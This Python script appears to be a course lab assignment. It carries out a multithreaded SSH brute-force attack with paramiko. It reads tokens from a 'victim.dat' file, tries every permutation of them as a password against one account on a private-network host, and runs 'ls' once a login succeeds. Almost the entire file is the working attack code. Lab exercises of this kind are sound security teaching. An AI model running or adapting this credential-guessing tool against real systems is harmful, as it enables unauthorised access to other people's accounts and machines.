#!/usr/bin/python3
import itertools
import paramiko
import threading
import time
import queue

thread_count = 4
def get_token():
    f = open("/home/csc2021/materials/victim.dat")
    token = f.read().splitlines()
    f.close()
    return token
def dictionary_attack(token):
    thread_list = []
    task = queue.Queue()
    for i in range(thread_count):
        thread_list.append(threading.Thread(target=ssh_connect2, args=(task,)))
    
    for token_num in range(1,len(token)+1):
        it = itertools.permutations(token, token_num)
        for A in it:
            password = "".join(A)
            task.put(password)
    
    for t in thread_list:
        t.start()
    #print(list(task.queue))
    for t in thread_list:
        t.join()
def ssh_connect2(task):
    host = "192.168.142.131"
    port = 22
    username = "csc2021"
    command = "ls"
    while True:
        if not task.empty():
            password = task.get_nowait()
            print("trying ", password)
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                sus = ssh.connect(host, port, username, password)
                print(sus)
                stdin, stdout, stderr = ssh.exec_command(command)
                lines = stdout.readlines()
                print(lines)
                task.queue.clear()
            except:
                pass
            finally:
                if ssh:
                    ssh.close()
        else:
            print("no task left")
            return
def ssh_connect(password):
    host = "192.168.142.131"
    port = 22
    username = "csc2021"
    #password = "csc20211"
    command = "ls"
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        sus = ssh.connect(host, port, username, password)
        print(sus)
        stdin, stdout, stderr = ssh.exec_command(command)
        lines = stdout.readlines()
        print(lines)
    except:
        pass
        #print("Mission Failed")
    finally:
        if ssh:
            ssh.close()
def main():
    print("HELLO WORLDY!")
    IT = itertools.permutations('ABCD', 2)
    tk = get_token()
    #print(tk)
    dictionary_attack(tk)
    for A, B in IT:
        print(A, B)
    #ssh_connect()
        
    exit(0)

if __name__== "__main__":
    main()